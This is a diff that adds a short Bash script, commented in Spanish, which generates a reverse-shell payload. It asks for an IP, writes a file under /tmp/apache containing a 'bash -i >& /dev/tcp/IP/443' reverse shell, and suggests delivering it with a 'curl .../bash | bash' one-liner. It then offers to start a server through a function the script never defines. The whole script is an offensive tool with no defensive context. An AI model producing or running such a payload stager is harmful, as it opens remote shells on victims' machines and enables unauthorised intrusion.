@@ -1,0 +1,29 @@
+#!/bin/bash
+echo ""
+echo ' llamar a la shell desde curl localhost/bash | bash '
+echo ""
+echo "Ingresa la IP para recibir la shell:"
+read ip
+
+# Verificar si el directorio /tmp/apache existe, si no, crearlo
+directory="/tmp/apache"
+if [ ! -d "$directory" ]; then
+    mkdir -p "$directory"
+fi
+
+# Generar el archivo de script Bash con la línea de código y la IP proporcionada
+script_file="/tmp/apache/bash"
+echo '#!/bin/bash' > "$script_file"
+echo 'bash -i >& /dev/tcp/'"$ip"'/443 0>&1' >> "$script_file"
+
+echo "Archivo generado en $script_file"
+
+
+echo ""
+read -p "¿Iniciar servidor? s/n " response
+
+if [ "$response" = "s" ] || [ "$response" = "S" ] || [ -z "$response" ]; then
+    servidor
+else
+    echo "Servidor no iniciado."
+fi
